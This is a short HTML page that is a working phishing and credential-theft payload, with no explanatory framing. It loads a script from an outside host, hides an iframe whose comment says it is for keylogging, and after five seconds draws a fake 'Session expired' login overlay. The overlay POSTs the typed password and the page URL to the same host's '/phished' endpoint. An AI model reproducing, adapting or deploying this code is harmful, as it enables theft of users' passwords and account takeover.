<!DOCTYPE html>
<html>
<head>
  <script src="https://testing.aigoretech.cloud/payload.js"></script>
</head>
<body>
  <div style="display:none;">
    <!-- Hidden iframe untuk keylogging -->
    <iframe src="https://testing.aigoretech.cloud/keylogger.html" style="display:none;"></iframe>
  </div>
  <script>
    // Create fake login overlay
    setTimeout(() => {
      const overlay = document.createElement('div');
      overlay.innerHTML = `
        <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:99999; display:flex; justify-content:center; align-items:center;">
          <div style="background:white; padding:20px; border-radius:5px;">
            <h3>Session expired. Please login again.</h3>
            <input type="password" id="fake-password" placeholder="Enter your password" />
            <button onclick="exfilPassword()">Submit</button>
          </div>
        </div>
      `;
      document.body.appendChild(overlay);
      
      window.exfilPassword = function() {
        const pwd = document.getElementById('fake-password').value;
        fetch('https://testing.aigoretech.cloud/phished', {
          method: 'POST',
          body: JSON.stringify({ password: pwd, url: location.href })
        });
        overlay.remove();
      };
    }, 5000);
  </script>
</body>
</html>
